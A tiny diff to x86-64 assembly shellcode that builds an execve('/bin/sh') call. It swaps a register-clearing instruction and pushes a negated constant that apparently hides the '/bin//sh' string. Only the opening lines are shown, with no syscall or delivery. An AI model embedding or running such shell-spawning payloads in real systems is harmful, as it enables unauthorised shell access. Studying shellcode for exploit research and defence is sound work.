@@ -1,5 +1,5 @@
 ;execve("/bin/sh", ["/bin/sh", NULL], [NULL])
-xor	eax, eax
+xor	rax, rax
 mov	rbx, 0xFF978CD091969DD1
 neg	rbx
 push	rbx
